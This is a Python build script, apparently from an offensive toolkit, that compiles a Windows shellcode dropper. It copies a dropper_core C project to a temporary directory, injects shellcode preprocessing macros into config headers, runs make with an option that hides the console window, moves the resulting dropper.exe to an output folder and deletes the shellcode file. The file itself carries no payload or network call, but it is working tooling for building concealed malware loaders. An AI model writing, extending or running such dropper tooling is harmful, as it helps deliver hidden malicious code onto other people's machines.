import os
import subprocess
import tempfile
import shutil

from datetime import datetime
from .header_generator import fill_config_header


DROPPER_CORE_PATH = '../dropper_core/'
OUTPUT_FILE = '../outputs/dropper.exe'

def copy_project_to_temp():
    # Create a unique temporary directory
    temp_dir = tempfile.mkdtemp()

    # Path to the original project folder
    project_core_path = os.path.abspath(DROPPER_CORE_PATH)

    # Check if the project_core folder exists
    if not os.path.exists(project_core_path):
        print(f"Error: The directory '{project_core_path}' does not exist.")
        return None

    # Copy the contents of the project_core folder to the temporary directory
    try:
        shutil.copytree(project_core_path, temp_dir, dirs_exist_ok=True)
        print(f"Project core successfully copied to {temp_dir}")
        return temp_dir
    except Exception as e:
        print(f"Error while copying the folder: {e}")
        return None

def replace_placeholders(file_path, replacements):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        for placeholder, value in replacements.items():
            if placeholder in line:
                lines[i] = line.replace(placeholder, value)
                break

    with open(file_path, 'w') as file:
        file.writelines(lines)

def set_makefile_source_files(source_path):    
    c_files = []
    for root, _, files in os.walk(source_path):
        for file in files:
            if file.endswith(".c"):
                c_files.append(os.path.relpath(os.path.join(root, file), start=source_path))

    formatted_sources = ""
    for i in range(0, len(c_files), 2):
        line = ' '.join(c_files[i:i+2])
        if i + 2 < len(c_files):
            formatted_sources += line + " \\\n"
        else:
            formatted_sources += line

    replace_placeholders(os.path.join(source_path, "Makefile"), {"/* SOURCE_FILES */": formatted_sources})    

def delete_file_or_directory(path: str = ""):
    """
    Deletes a file or directory at the specified path.

    :param path: The path to the file or directory to be deleted.
    """
    if not os.path.exists(path):
        print(f"The path '{path}' does not exist.")
        return

    if os.path.isfile(path):
        try:
            os.remove(path)
            print(f"File '{path}' has been deleted.")
        except Exception as e:
            print(f"Error deleting file '{path}': {e}")
    elif os.path.isdir(path):
        try:
            shutil.rmtree(path)
            print(f"Directory '{path}' has been deleted.")
        except Exception as e:
            print(f"Error deleting directory '{path}': {e}")
    else:
        print(f"The path '{path}' is neither a file nor a directory.")
    

def build_dropper(dropper_config: dict):
    """Builds a dropper by copying project files, generating shellcode, replacing placeholders, and running Makefile."""
    print('🔨 Compiling Dropper...')

    # Extract known parameters with default values
    out_filename = dropper_config.get("out_filename")
    shellcode_path = dropper_config.get("shellcode_path")

    # Step 1: Copy the project to a temporary directory
    temp_dir = copy_project_to_temp()

    # Step 2: Fill config headers with preprocessing macros and constants
    print(f"🔹 Shellcode pre-processing flags: {", ".join(dropper_config.get("preprocessing_macros"))}")
    fill_config_header(dropper_config, temp_dir)

    # Step 3: Construct the Make command
    set_makefile_source_files(temp_dir)
    hide_console = dropper_config.get('hide_console', None)
    command = ["make", "-f", "./Makefile", "-j10"] + [
        f"OUTPUT_FILE={out_filename}",
        f"HIDE_CONSOLE={"true" if hide_console else "false"}",
    ]

    print("🔹 Running command:", " ".join(command))  # Debugging output

    # Step 4: Run the make command with error handling
    try:
        subprocess.run(command, check=True, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        print("✅ Compilation done successfully.")
    except subprocess.CalledProcessError as e:
        print(f"❌ Compilation failed: {e}")
        print(f"#### Error Details ####")
        print(f"### Command:\n{command}\n")
        print(f"### stdout:\n{e.stdout}\n")
        print(f"### stderr:\n{e.stderr}\n")

    # Step 5: Move the output file to the specified output directory
    src = os.path.join(temp_dir, "bin", "dropper.exe")
    dst_dir = "./dropper_outputs/"
    dst = os.path.join(dst_dir, out_filename)

    if os.path.exists(dst):
        base, ext = os.path.splitext(out_filename)
        new_filename = f"{base}_{datetime.now().strftime('%d_%m_%Y-%H_%M_%S')}{ext}"
        dst = os.path.join(dst_dir, new_filename)

    try:
        print(src, dst)
        shutil.move(src, dst)
        print("✅ Output file moved successfully.")
    except Exception as e:
        print(f"❌ Failed to move output file: {e}")

    # Step 6: Clean up the temporary directory
    if shellcode_path:
        delete_file_or_directory(shellcode_path)
    #delete_file_or_directory(temp_dir)